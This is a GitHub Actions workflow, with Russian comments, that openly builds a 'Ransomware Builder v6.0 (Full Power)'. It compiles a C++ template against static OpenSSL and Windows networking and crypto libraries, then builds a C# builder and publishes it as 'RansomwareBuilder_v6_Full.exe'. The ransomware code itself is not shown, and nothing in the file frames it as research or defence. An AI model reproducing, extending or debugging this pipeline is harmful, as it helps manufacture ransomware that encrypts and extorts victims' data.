name: Build Ransomware Builder v6.0 (Full Power)

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    
    steps:
    - name: Checkout
      uses: actions/checkout@v4
    
    # ========== КЭШ VCPKG ==========
    - name: Cache vcpkg
      uses: actions/cache@v3
      id: cache-vcpkg
      with:
        path: |
          C:\vcpkg
          C:\vcpkg\installed
          C:\Users\runneradmin\AppData\Local\vcpkg\archives
        key: vcpkg-openssl-${{ runner.os }}
        restore-keys: |
          vcpkg-openssl-${{ runner.os }}
    
    # ========== УСТАНОВКА OPENSSL ==========
    - name: Install OpenSSL via vcpkg
      if: steps.cache-vcpkg.outputs.cache-hit != 'true'
      run: |
        vcpkg install openssl:x64-windows-static
    
    # ========== СБОРКА ШАБЛОНА ==========
    - name: Setup MSVC
      uses: ilammy/msvc-dev-cmd@v1
    
    - name: Build Template
      run: |
        Write-Host "=== Building template.cpp with vcpkg OpenSSL ==="
        
        if (-not (Test-Path "C:\vcpkg\installed\x64-windows-static\include\openssl\evp.h")) {
            Write-Host "OpenSSL not found!"
            exit 1
        }
        
        $ssl_lib = "C:\vcpkg\installed\x64-windows-static\lib\libssl.lib"
        $crypto_lib = "C:\vcpkg\installed\x64-windows-static\lib\libcrypto.lib"
        
        if (-not (Test-Path $ssl_lib)) {
            Write-Host "libssl.lib not found!"
            exit 1
        }
        
        Write-Host "Found libssl.lib at: $ssl_lib"
        Write-Host "Found libcrypto.lib at: $crypto_lib"
        
        cl /O2 /MT /EHsc /std:c++17 /I"C:\vcpkg\installed\x64-windows-static\include" /Fe:template.exe template.cpp /link user32.lib advapi32.lib shell32.lib crypt32.lib ws2_32.lib "$ssl_lib" "$crypto_lib"
        
        if (Test-Path template.exe) {
            Write-Host "=== Build SUCCESS ==="
            Get-ChildItem template.exe | Format-Table -AutoSize
        } else {
            Write-Host "=== Build FAILED ==="
            exit 1
        }
    
    # ========== СБОРКА БИЛДЕРА (C#) ==========
    - name: Setup MSBuild
      uses: microsoft/setup-msbuild@v2
    
    - name: Restore NuGet packages
      run: |
        dotnet restore builder.csproj --runtime win-x86
    
    - name: Build Builder
      run: |
        msbuild builder.csproj /p:Configuration=Release /p:Platform="Any CPU"
        
        # Проверяем правильный путь где реально создается файл
        if (Test-Path "bin\Any CPU\Release\net48\builder.exe") {
            Write-Host "=== Build SUCCESS ==="
            Get-ChildItem "bin\Any CPU\Release\net48\builder.exe" | Format-Table -AutoSize
            # Копируем в корень с правильным именем для загрузки
            Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v6_Full.exe"
        } else {
            Write-Host "=== Build FAILED ==="
            exit 1
        }
    
    - name: Upload Builder EXE
      uses: actions/upload-artifact@v4
      with:
        name: RansomwareBuilder_v6_Full
        path: RansomwareBuilder_v6_Full.exe
